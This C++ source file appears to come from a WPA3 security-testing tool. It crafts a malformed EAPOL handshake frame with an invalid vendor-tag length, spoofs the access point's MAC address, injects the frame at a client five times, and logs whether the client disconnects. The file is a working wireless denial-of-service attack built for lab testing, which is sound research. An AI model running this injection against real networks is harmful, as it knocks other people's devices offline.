#include <libtins-src/include/tins/llc.h>
#include <libtins-src/include/tins/packet_sender.h>
#include <libtins-src/include/tins/rawpdu.h>
#include <tins/hw_address.h>

#include "observer/mausezahn_wrapper.h"
#include "observer/tshark_wrapper.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester::eapol_logoff{
    using namespace std;
    using namespace Tins;

    RadioTap get_malformed_eapol(const HWAddress<6>& ap_mac,
                              const HWAddress<6>& sta_mac,
                              int ap_channel) {
        // 802.11 Data/QoS frame
        Dot11Data dot11;
        dot11.addr1(sta_mac);
        dot11.addr2(ap_mac);
        dot11.addr3(ap_mac);
        dot11.addr4(sta_mac);

        string eapol_hex =
                "02" // Version: 802.1X-2004 (2)
                "03" // Type: Key (3)
                "0075" // Length: 117
                "02" // Key Descriptor Type: EAPOL RSN Key (2)
                "0088" // Key Information: 0x0088 -> EAPOL Msg1
                "0010" // Key Length: 16
                "0000000000000005" // Replay Counter: 5
                // WPA Key Nonce
                "00000000000000000000000000000000"
                "00000000000000000000000000000000"

                "00000000000000000000000000000000" // Key IV
                "0000000000000000" // WPA Key RSC
                "0000000000000000" // WPA Key ID
                "00000000000000000000000000000000" // WPA Key MIC
                "0016" // WPA Key Data Length: 22
                //WPA Key Data
                "dd" //Tag Number: Vendor Specific (221)
                "ff" // Tag length: 255  <--------------------- INVALID length !!!!
                "000fac" // OUI: 00:0f:ac (Ieee 802.11)
                "04" // Vendor Specific OUI Type: 4
                "00000000000000000000000000000000"; // PMKID

        vector<uint8_t> eapol_bytes;
        for (size_t i = 0; i < eapol_hex.size(); i += 2) {
            string byte = eapol_hex.substr(i, 2);
            eapol_bytes.push_back(static_cast<uint8_t>(strtol(byte.c_str(), nullptr, 16)));
        }
        while(eapol_bytes.size() < 8) eapol_bytes.push_back(0x00);

        // Prepend SNAP bytes directly: OUI (3) + Type (2)
        vector<uint8_t> snap_bytes = {0x00, 0x00, 0x00, 0x88, 0x8e};
        eapol_bytes.insert(eapol_bytes.begin(), snap_bytes.begin(), snap_bytes.end());

        RawPDU raw_eapol(eapol_bytes);
        LLC llc(0xAA,0xAA);

        llc.inner_pdu(raw_eapol);
        llc.type(LLC::UNNUMBERED);
        llc.modifier_function(LLC::UI);
        dot11.inner_pdu(llc);

        //WLAN flags
        dot11.from_ds(1);     // From DS bit

        RadioTap radiotap;
        auto my_flags = static_cast<RadioTap::FrameFlags>(RadioTap::CFP | RadioTap::WEP);
        radiotap.flags(my_flags);
        radiotap.rate(2); // Rate in Mbps
        radiotap.channel(hw_capabilities::channel_to_freq(ap_channel), RadioTap::CCK);

        radiotap.inner_pdu(dot11);
        return radiotap;
    }

    void speed_observation_start(RunStatus& rs){
        observer::start_mausezahn(rs, "mz_gen", "client", "access_point");
        observer::start_tshark(rs, "client", "udp port 5201");
        observer::start_tshark(rs, "access_point", "udp port 5201");
    }

    void run_attack(RunStatus& rs){
        speed_observation_start(rs);

        const HWAddress<6> ap_mac(rs.get_actor("access_point")["mac"]);
        const HWAddress<6> sta_mac(rs.get_actor("client")["mac"]);
        const string iface_name = rs.get_actor("attacker")["iface"];
        const NetworkInterface iface(iface_name);
        const int channel = stoi(rs.get_actor("access_point")["channel"]);

        RadioTap radiotap = get_malformed_eapol(ap_mac, sta_mac, channel);
        PacketSender sender;

        this_thread::sleep_for(chrono::seconds(5));
        for (int i = 0; i < 5; ++i) {
            sender.send(radiotap, iface);
        }
        this_thread::sleep_for(chrono::seconds(10));
    }

    void stats(const RunStatus &rs){
        vector<observer::graph_lines> events;
        events.push_back({
            get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED"),"DISCONN","red"});
        events.push_back({
            get_time_logs(rs, "client", "@START"),"START","black"});
        events.push_back({
            get_time_logs(rs, "client", "@END"),"END","black"});

        const string STA_graph_path = observer::tshark_graph(rs, "client", events);
        const string AP_graph_path = observer::tshark_graph(rs, "access_point", events);
    }
}
